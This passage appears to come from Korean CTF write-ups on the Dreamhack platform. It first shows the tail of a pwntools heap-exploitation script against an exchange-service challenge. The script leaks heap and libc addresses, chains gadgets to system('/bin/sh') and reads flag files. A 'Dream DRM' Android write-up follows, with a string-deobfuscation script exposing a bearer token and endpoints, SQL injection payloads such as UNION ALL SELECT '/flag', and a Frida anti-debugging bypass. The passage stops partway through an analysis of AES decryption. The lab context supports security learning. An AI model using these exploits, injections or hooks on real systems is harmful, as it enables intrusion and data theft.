        s.sendafter("> ", writeProto(ExchangeEvent.BUY.value, buy={
            "symbol": symbol,
            "amount": amount,
            "timestamp": timestamp
        }))

    @staticmethod
    def sell(symbol, amount, timestamp):
        s.sendafter("> ", writeProto(ExchangeEvent.SELL.value, sell={
            "symbol": symbol,
            "amount": amount,
            "timestamp": timestamp
        }))

    @staticmethod
    def history(symbol, _type, ts):
        s.sendafter("> ", writeProto(ExchangeEvent.HISTORY.value, history={
            "symbol":symbol,
            "type":_type,
            "ts":ts
        }))

    @staticmethod
    def add_addressbook(symbol, address, memo, create_at_ts):
        s.sendafter("> ", writeProto(ExchangeEvent.ADD_ADDRESSBOOK.value, addressbook={
            "symbol":symbol,
            "address":address,
            "memo":memo,
            "create_at_ts":create_at_ts
        }))

    @staticmethod
    def modify_addressbook(_id, origin_addr, new_addr, memo):
        s.sendafter("> ", writeProto(ExchangeEvent.MODIFYADDRESSBOOK.value, modify_addressbook={
            "_id":_id,
            "origin_addr":origin_addr,
            "new_addr":new_addr,
            "memo":memo
        }))

    @staticmethod
    def del_addressbook(symbol, address, memo, create_at_ts):
        pass
    
    @staticmethod
    def deposit(address, symbol, memo):
        pass

# context.log_level = 'debug'

while True:
    # db("""
    # b* 'Exchange::handle_buy(protoss::Buy const&) '+0x39C
    # b* 'User::handle_signin(protoss::SignIn const&) '+0x2BF
    # b* 'modify_all_address(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >) '+0x376
    # b* 'modify_all_address(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >) '+0x446
    # b* 'Exchange::handle_buy(protoss::Buy const&)' +0x2C7
    # b* 'Exchange::handle_sell(protoss::Sell const&) '+0x260
    # """)

    UserClass.signup(b"A"*0x20, b"B"*0x20)
    UserClass.signin(b"A"*0x20, b"B"*0x20)

    for i in range(4):
        ExchangeClass.add_addressbook("XRP", b"MYADDRESS", b"123123", str(i+2))

    ExchangeClass.add_addressbook("XRP", b"A"*0x80+p16(0x31b0+8), b"123123", str(i+2))
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", p16(0x1000), b"memo")


    # db('')
    try:
        UserClass.myinfo()
        s.recvuntil('Username: ')
        data = s.recv(0x30)
        print(data)
        if b'Amount' in data:
            raise
    except:
        s.close()
        # s = connect('localhost', PROTOSS_PORT)
        s = connect('host3.dreamhack.games', DREAMHACK_PORT)
        continue


    leak = s.recv(6).ljust(8, b'\x00')
    if REMOTE:
        heap = u64(leak) - 0x113370
        heap -= 0x9100 # remote offset
        log.info(f"heap: {hex(heap)}")

        libc = u64(s.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) + 0xa7b20
        log.info(f"libc: {hex(libc)}")
    else:
        libc = u64(leak) + 0xea0e8
        log.info(f"libc: {hex(libc)}")
        s.recv(0x10+2)
        leak = s.recv(6).ljust(8, b'\x00')
        heap = u64(leak) - 0x112e70
        log.info(f"heap: {hex(heap)}")

    context.log_level = 'debug'
    system = libc + l.symbols['system']
    binsh = libc + next(l.search(b'/bin/sh'))
    log.info(f"system: {hex(system)}")
    log.info(f"binsh: {hex(binsh)}")

    user = heap + 0x191a0
    system_heap = user + 0x100
    log.info(f'user: {hex(user)}')
    log.info(f'system_heap: {hex(system_heap)}')

    cmd = b"1;sh;111"
    # 0x94924: detected sql injection: chr(0x24)
    gadget = libc + 0x0000000000094926 # : add BYTE PTR [rax],al ; mov rdi, qword ptr [rbx + 0x648] ; call qword ptr [rbx + 0x640]
    gadget2 = libc + 0x000000000008fff4 # : call qword ptr [rbx + 0x360] # stack pivoting

    ExchangeClass.add_addressbook("XRP", b"A"*0x100 + p64(gadget), b"123123", str(i+2))
    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user).strip(b'\x00'), b"123123", str(i+2))
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", p64(system_heap-0x8).strip(b'\x00'), b"memo")

    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x360 - 0x10).strip(b'\x00')+b"A", b"123123", str(i+2)) # null prevention
    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x360 - 0x10).strip(b'\x00'), b"123123", str(i+2)) # null prevention
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", b"A"*0x10+p64(system).strip(b'\x00'), b"memo")

    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x648).strip(b'\x00')+b"A", b"123123", str(i+2))
    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x648).strip(b'\x00'), b"123123", str(i+2))
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", p64(binsh).strip(b'\x00'), b"memo")

    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x640).strip(b'\x00')+b"A", b"123123", str(i+2))
    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x640).strip(b'\x00'), b"123123", str(i+2))
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", p64(gadget2).strip(b'\x00'), b"memo")

    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x100).strip(b'\x00')+b"A", b"123123", str(i+2))
    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x100).strip(b'\x00'), b"123123", str(i+2))
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", p64(gadget).strip(b'\x00'), b"memo")

    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x10).strip(b'\x00')+b"A", b"123123", str(i+2))
    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x10).strip(b'\x00'), b"123123", str(i+2))
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", p64(system_heap).strip(b'\x00'), b"memo")
    UserClass.myinfo()

    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x10).strip(b'\x00')+b"A", b"123123", str(i+2))
    ExchangeClass.add_addressbook("XRP", b"C"*0x80+p64(user+0x10).strip(b'\x00'), b"123123", str(i+2))
    ExchangeClass.modify_addressbook("-1", b"MYADDRESS", p64(user).strip(b'\x00'), b"memo")
    UserClass.myinfo()

    ExchangeClass.sell("XRP", str(1), "100")
    
    s.sendline('pwd')
    s.sendline('id')
    s.sendline('ls /')
    s.sendline('ls')
    s.sendline('cat /flag_1')
    s.sendline('cat /flag_2')
    s.interactive()
    exit()
```

# Dream DRM
## OverView
`DRM(Digital Rights Management)` 기술을 접목시킨 일종의 eBook 안드로이드 앱이다.

내부에서 사용하는 코드 조각들을 구글링해보면, `retrofit` 라이브러리를 이용하여 웹 통신을 구현하고 있음을 추측할 수 있다.

초기 화면에서 go를 누르면 아래 함수가 실행된다.
`e4.h.onClick:`
```java
                Integer[] v7_1 = new Integer[16];
                v7_1[0] = Integer.valueOf(0xF2);
                v7_1[1] = Integer.valueOf(90);
                v7_1[2] = Integer.valueOf(0xB6);
                v7_1[3] = Integer.valueOf(0x7E);
                v7_1[opCode] = Integer.valueOf(98);
                v7_1[5] = Integer.valueOf(130);
                v7_1[6] = Integer.valueOf(73);
                v7_1[7] = Integer.valueOf(0x9E);
                v7_1[8] = Integer.valueOf(0xB3);
                v7_1[9] = Integer.valueOf(0xE4);
                v7_1[10] = Integer.valueOf(0xFC);
                v7_1[11] = Integer.valueOf(0x77);
                v7_1[12] = Integer.valueOf(74);
                v7_1[13] = Integer.valueOf(45);
                v7_1[14] = Integer.valueOf(0xA9);
                v7_1[15] = Integer.valueOf(0x7F);
                m v6_1 = new m(v.ToList(((Object[])v7_1)));
                String v7_2 = ((Context)main).getString(0x7F0F00BF);
                o.IsNull(v7_2, "getString(R.string.user_agent)");
                v4_1.a("User-Agent", v6_1.a(v7_2));
                v7_1 = new Integer[16];
                v7_1[0] = Integer.valueOf(0xA1);
                v7_1[1] = Integer.valueOf(0xEF);
                v7_1[2] = Integer.valueOf(0xD7);
                v7_1[3] = Integer.valueOf(17);
                v7_1[opCode] = Integer.valueOf(0xE3);
                v7_1[5] = Integer.valueOf(0xD7);
                v7_1[6] = Integer.valueOf(0xB7);
                v7_1[7] = Integer.valueOf(0x81);
                v7_1[8] = Integer.valueOf(55);
                v7_1[9] = Integer.valueOf(0x7B);
                v7_1[10] = Integer.valueOf(66);
                v7_1[11] = Integer.valueOf(109);
                v7_1[12] = Integer.valueOf(0x93);
                v7_1[13] = Integer.valueOf(0xFD);
                v7_1[14] = Integer.valueOf(60);
                v7_1[15] = Integer.valueOf(1);
                v6_1 = new m(v.ToList(((Object[])v7_1)));
                v3 = ((Context)main).getString(0x7F0F001E);
                o.IsNull(v3, "getString(R.string.authorization)");
                v4_1.a("Authorization", v6_1.a(v3))
```
서버에 접속할 때, 헤더 정보들을 설정해주는데 난독화 되어있어 직접 요청을 보내기 위해서는 해당 난독화를 해제하여야 한다.

접속 후에는 RecyclerView를 이용하여 화면에 책 정보를 나열하는데, 해당 동작은 RecyclerAdapter의 onClickListener에서 이루어진다.
탑다운 방식으로 쭉 분석하다 보면, pdf를 서버로부터 받아와 복호화 후 클라이언트에 보여주는데, 이는 JNI를 통해 구현되어 있다.
`com.theori.dreamdrm.MainActivity:`
```java
    public final native boolean decrypt(String arg1, String arg2) {
    }
```
`e4.b:`
```java
        String v7_1 = this.c.a();
        String v8_2 = v2.getAbsolutePath();
        o.IsNull(v8_2, "file.absolutePath");
        if(!v1_1.decrypt(v8_2, v7_1)) {
            v1_1.o("Failed to decrypt encrypted file");
            return;
        }

        Intent v7_2 = new Intent(((Context)v1_1), PdfViewerActivity.class);
        v7_2.putExtra("pdfFilePath", v2.getAbsolutePath());
        ((Context)v1_1).startActivity(v7_2);
```

## Solution
언뜻 봐서는 서버로부터 `/flag`를 얻어올 방법이 없어보인다.
먼저, 수동으로 요청을 보내기 위하여 요청 헤더 값들의 난독화를 해제하였다(`java.lang.String`을 후킹해도 동일한 동작이 가능하다.):
```py
#! /usr/bin/python3

import base64

class Decrypt:
    def __init__(self):
        self.a = []
        self.b = 0
        self.c = 0

    def createKey(self, arg7: list):
        v4 = []
        v0 = 0x100
        self.a = [0]*v0
        v1 = [0]*v0
        v2 = 0
        v3 = 0
        while True:
            v4 = self.a
            if(v3 >= v0):
                break

            v4[v3] = v3
            v1[v3] = int(arg7[v3 % len(arg7)])
            v3 += 1

        v7 = 0
        while v2 < v0:
            v3 = v4[v2]
            v7 = (v7 + v3 + v1[v2]) % v0
            v5 = v4[v7]
            v4[v7] = v3
            v4[v2] = v5
            v2 += 1

    def decryptString(self, arg9: str) -> str:
        idx = 0
        v9 = base64.b64decode(arg9)
        buf = [0]*len(v9)
        v2 = len(v9)
        while idx < v2:
            v3 = (self.b + 1) % 0x100
            self.b = v3
            v4 = self.c
            v5 = self.a
            v6 = v5[v3]
            v4 = (v4 + v6) % 0x100
            self.c = v4
            v7 = v5[v4]
            v5[v4] = v6
            v5[v3] = v7
            buf[idx] = (v5[(v7 + v5[v4]) % 0x100] ^ v9[idx]) & 0xFF
            idx += 1

        return "".join(chr(i) for i in buf)

if __name__ == "__main__":
    dec = Decrypt()

    v9 = [0]*16
    v9[0] = 93
    v9[1] = 25
    v9[2] = 0x81
    v9[3] = 92
    v9[4] = 0xA2
    v9[5] = 0xC3
    v9[6] = 0xF3
    v9[7] = 0x92
    v9[8] = 18
    v9[9] = 33
    v9[10] = 0x9F
    v9[11] = 0x86
    v9[12] = 104
    v9[13] = 94
    v9[14] = 0xFC
    v9[15] = 0xA8
    dec.createKey(v9)

    book_path = "Lz+2zaay1x0XGb3FZ1e8uagOtyImlUfZ0/SxYKce5w=="
    res = dec.decryptString(book_path)
    print(res)

    dec = Decrypt()
    v7_1 = [0]*16
    v7_1[0] = 0xF2
    v7_1[1] = 90
    v7_1[2] = 0xB6
    v7_1[3] = 0x7E
    v7_1[4] = 98
    v7_1[5] = 130
    v7_1[6] = 73
    v7_1[7] = 0x9E
    v7_1[8] = 0xB3
    v7_1[9] = 0xE4
    v7_1[10] = 0xFC
    v7_1[11] = 0x77
    v7_1[12] = 74
    v7_1[13] = 45
    v7_1[14] = 0xA9
    v7_1[15] = 0x7F
    dec.createKey(v7_1)

    user_agent = "0+J3c+9ea5SMfAUvB/rn2AU="
    res = dec.decryptString(user_agent)
    print(res)

    dec = Decrypt()
    v7_1[0] = 0xA1
    v7_1[1] = 0xEF
    v7_1[2] = 0xD7
    v7_1[3] = 17
    v7_1[4] = 0xE3
    v7_1[5] = 0xD7
    v7_1[6] = 0xB7
    v7_1[7] = 0x81
    v7_1[8] = 55
    v7_1[9] = 0x7B
    v7_1[10] = 66
    v7_1[11] = 109
    v7_1[12] = 0x93
    v7_1[13] = 0xFD
    v7_1[14] = 60
    v7_1[15] = 1
    dec.createKey(v7_1)

    authorization = "6orCfU3OtzGoVnwwufNefZChhkXO4/sVOcBvwmTnuyQA6TjDOE1xANwBoNl63DlMnMSj9/8LES0FCCBh8mBimuqdfA=="

    res = dec.decryptString(authorization)
    print(res)

    dec = Decrypt()
    v8 = [0]*16
    v8[0] = 0xF9
    v8[1] = 34
    v8[2] = 0x93
    v8[3] = 28
    v8[4] = 0xED
    v8[5] = 0x20
    v8[6] = 7
    v8[7] = 0xA0
    v8[8] = 25
    v8[9] = 0xA6
    v8[10] = 82
    v8[11] = 0xA5
    v8[12] = 0x77
    v8[13] = 0xAD
    v8[14] = 0x98
    v8[15] = 0x95
    dec.createKey(v8)

    req_book_path = "/qrcqVJKx/BFGBX+HNlhLpUtzrnE3dza1DdeAWrGlD2IPXlJUHHWnN9u"
    res = dec.decryptString(req_book_path)
    print(res)

    dec = Decrypt()
    v8 = [130, 130, 0x99, 10, 107, 150, 0xB0, 0xF3, 0xAF, 0xA7, 21, 0x7C, 33, 0x84, 0xDD, 0xE3]
    dec.createKey(v8)

    download_path = "iiybW1aCSfRbbEn1Heogr/+6/3MsyBxEuvSJjhQdQoL+uh0="
    res = dec.decryptString(download_path)
    print(res)
```

결과는 다음과 같다:
```
/rhBZeQ89tAiYPD41yqoKQN6o/books # 책 리스트 요청
Dr3amDrmUs3rAg3nt # User Agent
Bearer c2VjcmV0X2F1dGhvcml6YXRpb25faGVhZGVyX2Zyb21fZHJlYW1kcm1fYXBw # Authorization
/vXxUDAXOnDqtlt13Vfgods6n/request_book?id= # 특정 책 요청
/CMPpMyH3jV0jzOFKI4oNLS9t/download/ # 특정 책 다운로드
```

각각의 기능을 써보면 `books` 기능을 통해 책의 기본적인 정보를 얻어오고, `request_book` 기능을 통해 복호화를 해제하기 위한 정보와 다운로드 경로를 얻어오며, 마지막으로 책을 다운로드한다는 것을 알 수 있다.

특정 책을 요청할 때, 아래와 같이 요청을 만들게 된다:
```
/vXxUDAXOnDqtlt13Vfgods6n/request_book?id=
```
조작할 부분이 해당 부분밖에 존재하지 않았다고 생각했기 때문에 `SQL Inection`을 시도하였다.
```
/vXxUDAXOnDqtlt13Vfgods6n/request_book?id=1 limit 0,1 # Success
/vXxUDAXOnDqtlt13Vfgods6n/request_book?id=1 limit 1,1 # Fail
```
위 테스트를 통해 `SQL Injection`이 가능하다고 결론을 내릴 수 있다. 반환되는 정보가 `fileName` 이라고 추측하여 아래와 같은 구문을 만들었다:
```
/vXxUDAXOnDqtlt13Vfgods6n/request_book?id=9 UNION ALL SELECT \'/flag\'
```
이를 통해 암호화된 `/flag`와 `key`를 얻을 수 있다.
수동으로 JNI decrypt 함수를 호출하여 바로 복호화된 `/flag`를 얻고 싶었지만 동작하지 않았기 때문에 JNI를 분석하기로 했다.

JNI를 분석하여 복호화 루틴을 분석하기만 하면 되기 때문에 간단할 것이라 생각했지만, 패킹이 걸려있는 듯 보였고 상황 상(군대) 에뮬레이터를 이용한 동적 디버깅만이 가능했다.
하지만 ARM JNI만이 정상적으로 동작했고, x86 64 JNI는 동작하지 않았기 때문에 루팅된 안드로이드 폰이 존재하지 않는 이상 메모리에 올라간 언패킹된 JNI를 정적으로 분석하는 것만이 가능했다.

또한 안티 디버깅이 존재하는데, 이는 후킹으로 간단히 우회할 수 있다:
```py
import frida
import sys

DEVICE = "127.0.0.1:5575"
PACKAGE = "com.theori.dreamdrm"

def on_message(message, data):
    print(f"{message} -> {data}")

js = '''
Java.perform(function(){
    var antiClass = Java.use("y.e");
    antiClass.c.implementation = function() {
        console.log("Hooking y.antiClass.detetAnti: ");
        console.log("Done.")

        return;
    }
});
'''
try:
    dev = frida.get_device(DEVICE)
    # dev = frida.get_usb_device()
    pid = dev.spawn([PACKAGE])
    print(f"App is Starting.. {pid}")
    process = dev.attach(pid)
    dev.resume(pid)
    
    script = process.create_script(js)
    script.on('message', on_message)
    print("Running..")
    script.load()
    input()

except Exception as e:
    print(e)
```

동적으로 애플리케이션에 붙어 언패킹된 decrypt 함수를 확인할 수 있다:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/30bdd3dd3c08d5174eb530a93f2499a03a974a0d25d8ca0f4431c8a473a0afc0.png)

편한 분석을 위해 구조체 구현을 얻어왔다:
https://gist.github.com/Jinmo/048776db75067dcd6c57f1154e65b868

복호화가 시작되는 부분이다:
```cpp
  key_decoded = base64_decode(env, key);
  if ( ((unsigned int (__fastcall *)(JNIEnv_ *, __int64))env->functions->GetArrayLength)(env, key_decoded) == 36 )
  {
    v13 = 0LL;
    v12 = 0;
    v11 = 0LL;
    v10 = 0LL;
    ((void (__fastcall *)(JNIEnv_ *, __int64, _QWORD, __int64, __int128 *))env->functions->GetByteArrayRegion)(
      env,
      key_decoded,
      0LL,
      16LL,
      &v13);
    ((void (__fastcall *)(JNIEnv_ *, __int64, __int64, __int64, __int64 *))env->functions->GetByteArrayRegion)(
      env,
      key_decoded,
      16LL,
      12LL,
      &v11);
    ((void (__fastcall *)(JNIEnv_ *, __int64, __int64, __int64, __int64 *))env->functions->GetByteArrayRegion)(
      env,
      key_decoded,
      28LL,
      8LL,
      &v10);
```
키를 base64 디코딩 후 16byte, 12byte, 8byte씩 짜른다.

그 후 복잡한 연산을 통해 키 스케줄링 후 라운드 키를 만들어 복호화를 진행한다.
동적으로 테이블을 만들어 연산하기 때문에 테이블을 통해 알고리즘을 특정하기는 어려웠다.
하지만 AES-NI가 사용되었기 때문에 AES 기반이라는 것은 확실하였다. 내부 루틴을 직접 분석하여 알고리즘을 특정하거나, custom AES임을 확인할 수 없어 다양한 알고리즘을 통해 복호화를 시도하였다.
16byte, 12byte, 8byte의 세 값을 사용하는 알고리즘은 AES-GCM이었기 때문에 이를 시도해보았지만 실패하였다.
crypto++, openssl, tiny-aes 등의 implementation도 참고하였지만 해당 복호화 동작과 비슷한 동작은 찾을 수 없었다.